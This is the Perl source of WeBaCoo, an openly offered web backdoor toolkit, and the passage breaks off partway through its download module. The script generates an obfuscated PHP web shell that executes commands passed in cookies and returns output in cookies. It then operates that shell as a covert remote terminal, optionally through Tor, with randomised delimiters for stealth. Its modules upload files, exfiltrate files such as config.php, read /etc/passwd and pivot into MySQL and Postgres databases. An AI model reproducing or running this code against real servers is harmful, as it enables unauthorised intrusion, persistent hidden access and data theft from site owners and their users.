#!/usr/bin/perl
# WeBaCoo - Web Backdoor Cookie Scripkit
# Copyright(c) 2011-2012 Anestis Bechtsoudis
# Website: https://github.com/anestisb/WeBaCoo

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

use strict;
use warnings;
use URI;
use Getopt::Std;
use File::Basename;
use MIME::Base64;
use IO::Socket;
use IO::Socket::Socks;
use Term::ANSIColor qw(:constants);
use if $^O eq "MSWin32", "Win32::Console::ANSI";

## Variables ##
my(%WEBACOO,%args);

# PHP system functions used in backdoor code
my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");

# Setup
$WEBACOO{name} = "webacoo.pl";
$WEBACOO{version} = '0.2.3';
$WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
$WEBACOO{author} = 'Anestis Bechtsoudis';
$WEBACOO{email} = 'anestis@bechtsoudis.com';
$WEBACOO{website} = 'http(s)://bechtsoudis.com';
$WEBACOO{twitter} = '@anestisb';
$WEBACOO{sfuntion} = $phpsf[0]; 		# Default is system()
$WEBACOO{agent} = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2";
$WEBACOO{cookie} = "M-cookie";			# Default cookie name
$WEBACOO{http_method} = "GET";			# Default HTTP method is 'GET'
$WEBACOO{delim} = '8zM$';			# Initialize delimiter
$WEBACOO{url} = '';
$WEBACOO{rhost} = '';
$WEBACOO{rport} = '80';
$WEBACOO{uri} = '';
$WEBACOO{proxy_ip} = '';
$WEBACOO{proxy_port} = '';
$WEBACOO{vlevel} = 0;				# Default verbose level=0
$WEBACOO{tor_ip} = "127.0.0.1";			# Default tor ip
$WEBACOO{tor_port} = "9050";			# Default tor port
$WEBACOO{shell_name} = "webacoo";		# Shell name
$WEBACOO{shell_head} = '$ ';			# Shell head character

## Help Global Variables ##
my $command = '';				# Command to be executed at target
my $loaded_module = '';				# Name of loaded module
my $module_ext_head = '';			# Extension module cmd header
my $module_ext_tail = '';			# Extension module cmd tail
my $request = '';				# HTTP Request Header
my $request_body = '';				# HTTP Request Body (used by modules)
my $body_len = '';				# HTTP Request Body length
my $body_bound = '';				# Boundary used by Upload module
my $output = '';				# Executed cmd output
my $output_str = '';				# Store buffer for executed cmd
my $sock = '';					# Established socket
my $tmp_fh = '';				# Help variable for filehandler flush

# HTTP Proxy variables
my @pargs = ();
my $proxy_user = '';
my $proxy_pass = '';

# Verbose data
my @verdata = ();

# Time variables for logging
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);

# Print WeBaCoo logo
print_logo();

# Parse command args
getopts("gf:ro:tu:e:m:c:a:d:p:v:l:h", \%args) or die "[-] Problem with the supplied arguments.\n";

# Check for newer version & apply update
if(defined $ARGV[0] && $ARGV[0] eq "update") { update(); }
# Check for invalid arguments
elsif(defined $ARGV[0]) { print "[-] Unknown option:$ARGV[0]\n"; exit; }

# Print usage in -h case
print_usage() if $args{h};

#################################################################################
# Generate backdoor code
#################################################################################
if(defined $args{g}) {

    # Check output filename
    if(!defined $args{o}) {
	print "[-] No output file specified.\n";
	exit;
    }

    # Check PHP function number if -f is used
    if(defined $args{f}) {
	if($args{f} =~ /^[1-5]$/) { $WEBACOO{sfuntion} = $phpsf[$args{f}-1]; }
	else { 
	    print "[-] -f $args{f}: Unknown function number.\n";
	    print "\nUse -h for help\n";
	    exit;
	}
    }

    generate_backdoor();
    exit;
}

#################################################################################
# Establish remote "terminal" connection
#################################################################################
if(defined $args{t}) {

    # Check URL
    if(!defined $args{u}) {
	print "[-] No url specified.\n";
	exit;
    }

    # Parse URL
    $WEBACOO{url} = URI->new($args{u});
    $WEBACOO{rhost} = $WEBACOO{url}->host;
    $WEBACOO{rport} = $WEBACOO{url}->port;
    $WEBACOO{uri} = $WEBACOO{url}->path;

    # Check for user specified user-agent
    if(defined $args{a}) { $WEBACOO{agent}=$args{a}; }

    # Check for user specified HTTP method
    if(defined $args{m}) { $WEBACOO{http_method}=$args{m}; }

    # Check for user specified cookie-name
    if(defined $args{c}) { $WEBACOO{cookie}=$args{c}; }

    # Check for user specified delimiter
    if(defined $args{d}) { 
	$WEBACOO{delim}=$args{d};
	print "[!] Delimiter will remain the same for every request.\n";
	print "    Without the -d flag, a different random delimiter is used for each request,\n";
	print "    enhancing stealth behavior.\n\n";
    }

    # Delimiter cannot be equal to cookie name
    if(defined $args{d} && defined $args{c} && ($args{d} eq $args{c})) { 
	print "[-] Use DELIM != C_NAME\n"; exit; 
    }

    # Check for user specified verbose levels
    if(defined $args{v}) {
	if($args{v} =~ /^[0-2]$/) { $WEBACOO{vlevel} = $args{v}; }
	else {
	    print "[-] -v $args{v}: Unknown verbosity level.\n";
	    print "\nUse -h for help\n";
	    exit;
	}
    }

    # Check for user specified log file
    if(defined $args{l}) { 
	if(!open LOG_FILE,">>$args{l}") { print "[-] Problem opening log file.\n"; exit; }
    }

    # Single command execution mode
    if(defined $args{e}) {
	$command = $args{e};
	print "[*] Executing '$command'.\n";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request("1"); }
	else { cmd_request("1"); }
	exit;
    }

    # If Tor check connectivity status
    if(defined $args{p} && $args{p} eq "tor") { tor_check(); }

    # Initial check & print user info
    $command="id";
    print "[+] Connecting to remote server as...\n";
    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
    else { cmd_request(); }

    # Print help messages
    print "\n[*] Type 'load' to use an extension module.\n";
    print "[*] Type ':<cmd>' to run local OS commands.\n";
    print "[*] Type 'exit' to quit terminal.\n\n";

    # "Terminal" connection loop
    while(1) {
	# Check if terminal before user interraction
	if(-t STDOUT) { 
	    print BOLD,RED,$WEBACOO{shell_name},BLUE,$WEBACOO{shell_head},RESET; 
	}
	else { print '[-] Need to run under terminal.'; exit; }
	chop($command=<STDIN>);

	# Check for local external OS commands
	if(substr($command, 0, 1) eq ":") {
	    # Trim ':' from string head
	    substr($command, 0, 1) = "";
	    # Execute system command
	    system($command);
	    next;
	}

	# Exit if "exit" is typed
	if($command eq "exit") {
	    # Close log file handler, if log feature used
	    close(LOG_FILE) if(defined $args{l});
	    print "Bye...\n"; 
	    last; 
	}

	# Check for module load function
	elsif($command eq "load") { load_module(); next; }
	# Check for module unload function
	elsif($command eq "unload") { unload_module(); next; }

	# If no user specified delimiter, set a new random one for each request
	random_delim() if(!defined $args{d});

	# Follow the relative branch (normal or through TOR)
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request("1"); }
	else { cmd_request("1"); }
    }
}


#################################################################################
# Help functions
#################################################################################

#################################################################################
# Print logo
sub print_logo
{
    # Check if terminal for colored output
    if(-t STDOUT) {
	print "\n",BLUE,BOLD,"\tWeBaCoo $WEBACOO{version}",RESET;
	print BLUE," - $WEBACOO{description}\n";
	print GREEN,"\tCopyright (C) 2011-2012 ",RESET,GREEN,BOLD,"$WEBACOO{author}\n",RESET;
	print GREEN,"\t{ ",YELLOW,"$WEBACOO{twitter} ",GREEN,"|",YELLOW," $WEBACOO{email} ";
	print GREEN,"|",YELLOW," $WEBACOO{website}",GREEN," }\n\n",RESET;

	# Flush output buffer
	$|++;
    }
    else {
	print "\n\tWeBaCoo $WEBACOO{version} - $WEBACOO{description}\n";
	print "\tCopyright (C) 2011-2012 $WEBACOO{author}\n";
	print "\t{ $WEBACOO{twitter} | $WEBACOO{email} | $WEBACOO{website} }\n\n";
    }
}

#################################################################################
# Update
sub update
{
    # Search for project dir & git system command
    if(-d "./.git/" && !system("which git > /dev/null")) {
	print "[+] Checking for newer versions...\n";
	system("git pull");
	print "\n";
    }
    else {
	print "[-] Error with git repository update.\n\n";
	print "Download latest version from:\n";
	print "https://github.com/anestisb/WeBaCoo/zipball/master\n\n";
    }
}

#################################################################################
# Print help page
sub print_usage
{
print qq(
Usage: webacoo.pl [options]

Options:
  -g		Generate backdoor code (-o is required)

  -f FUNCTION	PHP System function to use
	FUNCTION
		1: system 	(default)
		2: shell_exec
		3: exec
		4: passthru
		5: popen

  -o OUTPUT	Generated backdoor output filename

  -r 		Return un-obfuscated backdoor code

  -t		Establish remote "terminal" connection (-u is required)

  -u URL	Backdoor URL

  -e CMD	Single command execution mode (-t and -u are required)

  -m METHOD	HTTP method to be used (default is GET)

  -c C_NAME	Cookie name (default: "M-cookie")

  -d DELIM	Delimiter (default: New random for each request)

  -a AGENT	HTTP header user-agent (default exist)

  -p PROXY	Use proxy (tor, ip:port or user:pass:ip:port)

  -v LEVEL	Verbose level
	LEVEL
		0: no additional info (default)
		1: print HTTP headers
		2: print HTTP headers + data

  -l LOG	Log activity to file

  -h		Display help and exit

  update	Check for updates and apply if any
);

exit;
}

#################################################################################
# Generate backdoor code
sub generate_backdoor
{
    my $cmd = '';

    # Command is retrieved under the relative Cookie from the client 
    if(!$args{r}) { $cmd = "base64_decode(\$_COOKIE['cm'])"; }
    # If raw output mode used, protect base64 decoder
    else { $cmd = "\$b(\$_COOKIE['cm'])"; }

    # PHP system functions usage
    my %payloads = (
	"system" => "system($cmd.' 2>&1');",
	"shell_exec" => "echo shell_exec($cmd.' 2>&1');",
	"exec" => "exec($cmd.' 2>&1', \$d);echo(join(\"\\n\",\$d).\"\\n\");",
	"passthru" => "passthru($cmd.' 2>&1');",
	"popen" => "\$h=popen($cmd.' 2>&1','r');while(!feof(\$h))echo(fread(\$h,2048));pclose(\$h);",
    );

    # Form the final payload
    my $payload = "if(isset(\$_COOKIE['cm'])){ob_start();";
    $payload .= '$b=strrev("edoced_4"."6esab");' if ($args{r});
    $payload .= "$payloads{$WEBACOO{sfuntion}}setcookie(\$_COOKIE['cn'],\$_COOKIE['cp'].".
	"base64_encode(ob_get_contents()).\$_COOKIE['cp']);ob_end_clean();}";

    # PHP tags
    my $prefix = "<?php ";
    my $suffix = " ?>";

    # Check for raw code output flag,
    # otherwise encode payload & append the tags
    if(!defined $args{r}) {
	$payload = encode_base64($payload, '');
	# insert space after each character
	$payload =~ s/(\S{1})/$1 /g;
	$prefix .= '$b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","';
	$suffix = "\")));".$suffix;
    }

    # Create backdoor file
    open (OUTFILE, ">$args{o}");
    print OUTFILE $prefix.$payload.$suffix;
    close (OUTFILE);
    print "[+] Backdoor file \"$args{o}\" created.\n";
}

#################################################################################
# Backdoor cmd: send request & get response
sub cmd_request
{
    # Silent flag
    my $silent = @_;

    # Port assign
    my $dst_host = $WEBACOO{rhost};
    my $dst_port = $WEBACOO{rport};

    if(index($command,'>>') ne -1) {
	print "[!] Using '>>' for file append might broke the backdoor code.\n";
	print "[!] Prefer 'tee -a' for file append operations.\n";
    }

    # Append & prepend extension modules data
    $command = $module_ext_head.$command.$module_ext_tail;

    # Check for Proxy args
    if(defined $args{p}) { 
	@pargs=split(':',$args{p});
	if(@pargs==2) { ($dst_host, $dst_port) = @pargs; }
	elsif(@pargs==4) { ($proxy_user, $proxy_pass, $dst_host, $dst_port) = @pargs; }
	else { 
	    print "[-] Invalid Proxy arguments.\n"; 
	    print "\nUse -h for help\n";
	    exit; 
	}
    }

    # Form HTTP request
    $request = "$WEBACOO{http_method} http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
    $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
    $request .= "Agent: $WEBACOO{agent}\r\n";
    $request .= "Connection: Close\r\n";
    $request .= "Cookie: cm=".encode_base64($command,'').";".
	" cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
    $request .= "Proxy-Authorization: Basic ".encode_base64($proxy_user.":".$proxy_pass,'').
	"\r\n" if($proxy_user && $proxy_pass);
    $request .= "Content-Type: multipart/form-data; boundary=---------------------------".
	"$body_bound\r\n" if($loaded_module eq "upload");
    $request .= "Content-Length: $body_len\r\n" if($loaded_module eq "upload");
    $request .= "\r\n";

    # Print request if verbose level > 0
    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0 && $silent);

    # Establish connection
    $sock = IO::Socket::INET->new(
                                  PeerAddr=> $dst_host,
                                  PeerPort => $dst_port,
                                  Proto => "tcp",
                                 );
    # Error checking
    die "Could not create socket: $!\n" unless $sock;

    # Send HTTP request
    print $sock $request.$request_body;

    # Get server response
    my $line;
    while ($line = <$sock>) { $output .= $line; }

    # Close socket
    close($sock);

    # Unescape URI escaped special characters
    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;

    # Split HTTP header + data and print according to verbose level
    @verdata = split (/^\r\n/m,$output);
    $verdata[1] = "" if (@verdata == 1); # If data field is empty
    chomp($verdata[0]);
    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0 && $silent);
    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1 && $silent);
    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0 && $silent);

    # Check for HTTP 4xx error status codes
    if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
    {
	print "\n[-] 4xx error server response.\n";
	print "Terminal closed.\n";
	exit ;
    }

    # Check if server responded with the correct cookie name
    # Bypass check in case of Upload module
    if(($output !~ m/Set-Cookie: $WEBACOO{cookie}/) && $loaded_module ne "upload" ) {
	print "[-] Server has not responded with the expected cookie name.\n";
	exit;
    }

    # Locate cookie data
    my $start = index($output,$WEBACOO{delim})+length($WEBACOO{delim});
    my $end = index($output,$WEBACOO{delim},$start);
    $output = substr($output,$start,$end-$start);

    # Check for disabled PHP system functions
    if(!$output && $command eq "id") { 
	print "\n[-] Response cookie has no data.\n"; 
	print "[!] Backdoor PHP system function possibly disabled.\n";
    }
    # Decode response and print output
    else { 
	$output = decode_base64($output);
	# Beautify in case of mysql-cli module
	if($loaded_module eq "mysql-cli") {
	    $output =~ s/\n/\n\n/;
        }
	
	# Do not print output if:
	# - '(down/up)load' module is loaded
	# - stealth module is loaded
	# - output is empty
	if(($output ne "\n")and(index($loaded_module,"load") eq -1)and($loaded_module ne 'stealth')) { 
	    print $output; 
	}

	# Store cmd output to output storage buffer
	$output_str = $output;
	chop($output_str);

	# Log executed command
	if(defined $args{l}) {
	    # Get date
	    ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime(time);
	    printf LOG_FILE "[%4d-%02d-%02d %02d:%02d:%02d]",$year+1900,$mon+1,$mday,$hour,$min,$sec;
	    print LOG_FILE " - $WEBACOO{rhost} - $WEBACOO{http_method} $WEBACOO{uri} - ";

	    # Log if traffic is direct of via proxy
	    if(defined $args{p}) { print LOG_FILE "PROXY"; }
	    else { print LOG_FILE "DIRECT"; }
	    print LOG_FILE " - { $command } - { ";

	    # Escape new lines to have a compact single line log
	    $output =~ s/\n/\\n/g;
	    print LOG_FILE $output if($loaded_module ne "upload");
	    print LOG_FILE " }\n";

	    # Flush file handler to avoid losing entries in case of kill
	    $tmp_fh = select(STDOUT);
	    select(LOG_FILE);
	    $|++;
	    select($tmp_fh);
	}
    }

    # Flush content buffers
    @verdata = ();
    $output = '';
    $command = '';
}

#################################################################################
# Check Tor connectivity
sub tor_check
{
    print "[*] Checking Tor connectivity...\n\n";

    # Check Tor tcp socket
    my $tor_sock = IO::Socket::INET->new(
                                         PeerAddr => $WEBACOO{tor_ip},
                                         PeerPort => $WEBACOO{tor_port},
                                         Proto => "tcp",
                                        );
    if($tor_sock) { print "[+] TCP Socket is listening at $WEBACOO{tor_ip}:$WEBACOO{tor_port}\n"; }
    else { 
	print "[-] TCP Socket is not listening at $WEBACOO{tor_ip}:$WEBACOO{tor_port}\n\n"; 
	print "    Program exited.\n"; 
	exit;
    }

    # Hit whatismyip to find exit node ip
    $sock = IO::Socket::Socks->new(
				   ProxyAddr=>$WEBACOO{tor_ip},
                                   ProxyPort=>$WEBACOO{tor_port},
                                   ConnectAddr=>"98.207.221.49",
                                   ConnectPort=>"80",
                                  );
    die "Could not create socks proxy socket: $!\n" unless $sock;

    $request = "GET / HTTP/1.1\r\n";
    $request .= "Host: whatismyip.org:80\r\n";
    $request .= "\r\n";

    print $sock $request;

    my $line;
    while ($line = <$sock>) { $output .= $line; }

    if(defined $output) { print "[+] Tor connection established.\n"; }

    # Check if ip is valid
    if($output =~ m/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/)
    {
	print "Tor exit node: $1\n\n";
    }

    # Flush buffer & close socket
    $output='';
    close($sock);
}

#################################################################################
# Backdoor cmd over tor: send request & get response
sub tor_cmd_request
{
    # Silent flag
    my $silent = @_;

    # Append & prepend extension modules data
    $command = $module_ext_head.$command.$module_ext_tail;

    # Form HTTP request
    $request = "$WEBACOO{http_method} http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
    $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
    $request .= "Agent: $WEBACOO{agent}\r\n";
    $request .= "Connection: Close\r\n";
    $request .= "Cookie: cm=".encode_base64($command,'').";".
		" cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
    $request .= "Content-Type: multipart/form-data; boundary=---------------------------".
		"$body_bound\r\n" if($loaded_module eq "upload");
    $request .= "Content-Length: $body_len\r\n" if($loaded_module eq "upload");
    $request .= "\r\n";

    # Print request if verbose level > 0
    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0 && $silent);

    # Connect to server via Tor
    $sock = IO::Socket::Socks->new(
                                   ProxyAddr=>$WEBACOO{tor_ip},
                                   ProxyPort=>$WEBACOO{tor_port},
                                   ConnectAddr=>$WEBACOO{rhost},
                                   ConnectPort=>$WEBACOO{rport},
                                  );
    # Error checking
    die "Could not create socks proxy socket: $!\n" unless $sock;

    # Send HTTP request
    print $sock $request.$request_body;

    # Get server response
    my $line;
    while ($line = <$sock>) { $output .= $line; }

    # Close socket
    close($sock);

    # Unescape URI escaped special characters
    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;

    # Split HTTP header + data and print according to verbose level
    @verdata = split (/^\r\n/m,$output);
    $verdata[1] = "" if (@verdata == 1); # If data field is empty
    chomp($verdata[0]);
    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0 && $silent);
    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1 && $silent);
    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0 && $silent);

    # Check for HTTP 4xx error status codes
    if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
    {
	print "\n[-] 4xx error server response.\n";
	print "Terminal closed.\n";
	exit ;
    }

    # Check if server responded with the correct cookie name
    # Bypass check in case of Upload module
    if(($output !~ m/Set-Cookie: $WEBACOO{cookie}/) && $loaded_module ne "upload" ) { 
	print "[-] Server has not responded with the expected cookie name.\n"; 
	exit;
    }

    # Locate cookie data
    my $start = index($output,$WEBACOO{delim})+length($WEBACOO{delim});
    my $end = index($output,$WEBACOO{delim},$start);
    $output = substr($output,$start,$end-$start);

    # Check for disabled PHP system functions
    if(!$output && $command eq "id") {
	print "\n[-] Response cookie has no data.\n";
	print "[!] Backdoor PHP system function possibly disabled.\n";
    }
    # Decode response and print output
    else {
	$output = decode_base64($output);
	# Beautify in case of mysql-cli module
	if($loaded_module eq "mysql-cli") {
	    $output =~ s/\n/\n\n/;
	}

	# Do not print output if:
	# - '(down/up)load' module is loaded
	# - stealth module is loaded
	# - output is empty
	if(($output ne "\n")and(index($loaded_module,"load") eq -1)and($loaded_module ne 'stealth')) {
	    print $output;
	}

	# Store cmd output to output storage buffer
	$output_str = $output;
	chop($output_str);
	
	# Log executed command
	if(defined $args{l}) {
	    # Get date
	    ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime(time);
	    printf LOG_FILE "[%4d-%02d-%02d %02d:%02d:%02d]",$year+1900,$mon+1,$mday,$hour,$min,$sec;
	    print LOG_FILE " - $WEBACOO{rhost} - $WEBACOO{http_method} $WEBACOO{uri} - TOR - { $command } - { ";

	    # Escape new lines to have a compact single line log
	    $output =~ s/\n/\\n/g;

	    # Log command output
	    print LOG_FILE $output if($loaded_module ne "upload");
	    print LOG_FILE " }\n";

	    # Flush file handler to avoid losing entries in case of kill
	    $tmp_fh = select(STDOUT);
	    select(LOG_FILE);
	    $|++;
	    select($tmp_fh);
	}
    }

    # Flush content buffers
    @verdata = ();
    $output = '';
    $command = '';
}

#################################################################################
# Randomize delimiter string
sub random_delim
{
    # Base64 valid characters
    my @vchars=('a'..'z','A'..'Z','0'..'9');
    # Base64 non-valid characters
    my @nvchars=('!','@','#','$','%','^','&','*','?','~');

    # Flush delimiter
    $WEBACOO{delim}='';

    # Create new delimiter with 4 chars
    # 3 valid + 1 non-valid
    foreach (1..3)
    {
	$WEBACOO{delim}.=$vchars[rand @vchars];
    }
    $WEBACOO{delim}.=$nvchars[rand @nvchars];
}

#################################################################################
# Load extension modules
sub load_module
{
    my $mod_input = '';

    # Check if another module is loaded
    if($loaded_module) { 
	print "[-] Another module is loaded. Unload the old one first.\n";
	return;
    }

    # Print available modules
    print "Currently available extension modules:\n";
    print "o MySQL-CLI: MySQL Command Line Module\n";
    print "    mysql-cli <IP(:port)> <user> <pass>".
	"      (ex. 'mysql-cli 10.0.1.11 admin pAsS')\n\n";
    print "o PSQL-CLI: Postgres Command Line Module\n";
    print "    psql-cli <IP(:port)> <db> <user> <pass>".
	"  (ex. 'psql-cli 10.0.1.12 testDB root pAsS')\n\n";
    print "o Upload: File Upload Module\n";
    print "    upload <local_file> <remote_dir>".
	"         (ex. 'upload exploit.c /tmp/')\n\n";
    print "o Download: File Download Module\n";
    print "    download <remote_file>".
	"                   (ex. 'download config.php')\n\n";
    print "o Stealth: Enhance Stealth Module\n";
    print "    stealth <webroot_dir>".
	"                 (ex. 'stealth /var/www/html')\n\n";
    print "[*] Type the module name with the correct args.\n\n";

    # Get user's choice
    print '> ';
    chop($mod_input=<STDIN>);
    my @modargs=split(' ',$mod_input);
    if(!@modargs) { print "[-] No module selected.\n"; return; }

    # MySQL-CLI Module
    if($modargs[0] eq "mysql-cli") {
	if(@modargs != 4) { print "[-] Error loading mysql-cli module\n"; return; }

	# Check for non default port
	my ($db_ip,$db_port) = split(':',$modargs[1]);
	$db_port = '3306' if(!defined $db_port);

	# Update 'shell' options
	$loaded_module = "mysql-cli";
	$WEBACOO{shell_name} = "mysql-cli";
	$WEBACOO{shell_head} = "> ";
	$module_ext_head = "mysql -h $db_ip -P $db_port -u$modargs[2] -p$modargs[3] -e '";
	$module_ext_tail = "'";
    }
    # PSQL-CLI Module
    elsif($modargs[0] eq "psql-cli") {
	if(@modargs != 5) { print "[-] Error loading psql-cli module\n"; return; }

	# Check for non default port
	my ($db_ip,$db_port) = split(':',$modargs[1]);
	$db_port = '5432' if(!defined $db_port);

	# Locate running user's home directory
	$command = "cat /etc/passwd | grep `whoami` | awk -F: '{print \$6}'";
	print "[*] Detected home dir: ";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }

	# Create credentials Postgres file to bypass interactive password authentication
	$command="echo '*:*:*:*:$modargs[4]'> $output_str/.pgpass; chmod 600 $output_str/.pgpass";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }
	print "[*] Credentials file created at: ~/.pgpass\n";
	print "[!] Don't **forget** to delete it before exiting.\n";

	# Update 'shell' options
	$loaded_module = "psql-cli";
	$WEBACOO{shell_name} = "psql-cli";
	$WEBACOO{shell_head} = "> ";
	$module_ext_head = "psql -h $db_ip -p $db_port -U $modargs[3] -d $modargs[2] -t -q -c '";
	$module_ext_tail = "'";
    }
    # Upload Module
    elsif($modargs[0] eq "upload") {
	if(@modargs != 3) { print "[-] Error loading upload module\n"; return; }
	
	# Validate remote directory argument
	if(!($modargs[2] =~ /(^\/).+(\/$)/)) { 
	    print "[!] Upload directory is invalid.\n"; 
	    return;
	}

	# Read local file
	my $lfile = "";
	if(!open FILE,$modargs[1]) { print "[-] Problem opening local file.\n"; return; }
	while (<FILE>){
	    $lfile .= $_;
	}
	close FILE;

	# Get PHP configuration Settings
	print "[*] PHP upload configuration settings:\n";
	$command = 'php -r \'echo "File Uploads   :";echo (ini_get("file_uploads"))?"ON":"OFF";'.
		   'echo "\nUpload Max Size:".ini_get("upload_max_filesize")."\n";\'';
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }
	print "\n";

	# If PHP-CLI didn't work, ask user how to continue
	if(index($output_str,'not found') ne -1) {
	    print "[!] PHP CLI command not found.\n";
	    print "[?] Continue with file upload ('yes' or 'no')? ";
	    my $answer = '';
	    chop($answer=<STDIN>);
	    if($answer ne 'yes') { return; }
	}
	elsif(index($output_str,'OFF') ne -1) {
	    print "[!] File uploads via HTTP POST are disabled.\n";
	    return;
	}

	# Generate a random string name for the PHP uploader file
	my $tmp_fup = &random_string(6).'.php';

	# Generate a random string name for the uploaded file
	my $tmp_up = &random_string(6);

	# Check if PHP uploader file is writable
	$command = "touch $tmp_fup";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }
	if(index($output_str,'denied') ne -1) {
	    print "[-] PHP Uploader file cannot be written.\n";
	    return ;
	}

	# Write PHP uploader file
	$command = 'echo \'<?php if($_FILES["file"]["error"]>0){exit;}'.
	           'else{move_uploaded_file($_FILES["file"]["tmp_name"],'.
	           "\"$modargs[2]\"".'.$_FILES["file"]["name"]);}\'> ./'."$tmp_fup";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }

	# Form POST Request body
	$body_bound = int(rand(2000000000))+1000000000;
	$request_body = "-----------------------------$body_bound\r\n";
	$request_body .= "Content-Disposition: form-data; name=\"file\"; filename=\"$tmp_up\"\r\n";
	$request_body .= "Content-Type: text/plain\r\n\r\n";
	$request_body .= "$lfile";
	$request_body .= "\r\n-----------------------------$body_bound\r\n";
	$request_body .= "Content-Disposition: form-data; name=\"submit\"\r\n\r\n";
	$request_body .= "Submit";
	$request_body .= "\r\n-----------------------------$body_bound--\r\n";

	# Calculate body length
	$body_len = length($request_body);

	# Temporaly change global variables for the POST request
	my $tmp_method = $WEBACOO{http_method};
	$WEBACOO{http_method} = "POST";
	my $tmp_uri = $WEBACOO{uri};
	my @uri_segs = $WEBACOO{url}->path_segments();
	pop @uri_segs;
	push @uri_segs, $tmp_fup;
	$WEBACOO{url}->path_segments(@uri_segs);
	$WEBACOO{uri} = $WEBACOO{url}->path;
	$loaded_module = "upload";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }

	# Restore global variables
	$WEBACOO{http_method} = $tmp_method;
	$WEBACOO{uri} = $tmp_uri;
	$loaded_module = "";

	# Remove PHP uploader file
	$command = "rm $tmp_fup";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }

	# Check if file uploaded successfully
	$command = "touch $modargs[2]$tmp_up";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }
	if(index($output_str,'denied') ne -1) {
	    print "[-] File upload failed. Double check permissions.\n";
	    return ;
	}

	# Print success message with upload path
	print "[+] File uploaded at ".$modargs[2].$tmp_up."\n";

	# Upload module doesn't need unload
	print "[*] Upload module unloaded.\n";
	return ; 
    }
    # Download Module
    elsif($modargs[0] eq "download") {
	# Module is currently not functional under Windows OS
	if($^O eq "MSWin32") { print "[-] Module currently does not support Windows OS.\n"; return; }

	# 'xxd' tool is required for this module.
	if(`which xxd` eq '') {
	    print "[-] 'xxd' not found at local client machine.\n"; 
	    print "[*] Install 'xxd' or edit source code to manually handle the hexdumps.\n";
	    return; 
	}

	# Argument checking
	if(@modargs != 2) { print "[-] Error loading upload module\n"; return; }

	# Update loaded module buffer
	$loaded_module = "download";

	#### Module variables
	# Pivot every 1000 bytes from source file
	#  - ~3.0K if output in octal (od tool)
	#  - ~2.0K if output in hex (xxd tool)
	my $pivot = 0;

	# Available server tool (xxd, od)
	my $tool = '';

	# Base filename for local file
	my $lfile = basename $modargs[1];
	####

	# Check if 'xxd' tool is available in remote server
	print "[*] Checking for 'xxd' tool.\n";
	$command = 'which xxd';
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }
	
	# If 'xxd' not found proceed with 'od' tool check
	if($output_str eq '') {
	    print "[-] 'xxd' tool is not available.\n\n";

	    # Check if od tool is available
	    print "[*] Checking for 'od' tool.\n";
	    $command = 'which od';
	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	    else { cmd_request(); }

	    # If neither 'od' tool is available,
	    # print message and unload module.
	    if($output_str eq '') {
		print "[-] 'od' tool is not available.\n\n";
		print "[-] Download module failed and unloaded.\n";
		$loaded_module = '';
		return ;
	    }
	    # Proceed with 'od' tool
	    else {
		print "[*] Proceed to download using 'od' tool.\n\n";
		$tool = 'od';
		$command = "od -An -b -N 1000 -j $pivot $modargs[1]";
	    }
	}
	# Proceed with 'xxd' tool
	else {
	    print "[*] Proceed to download using 'xxd' tool.\n\n";
	    $tool = 'xxd';
	    $command = "xxd -ps -l 1000 -s $pivot $modargs[1]";
	}

	# Get the first chunk
	print "[*] Retrieving 0-1000 bytes of remote file.\n";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
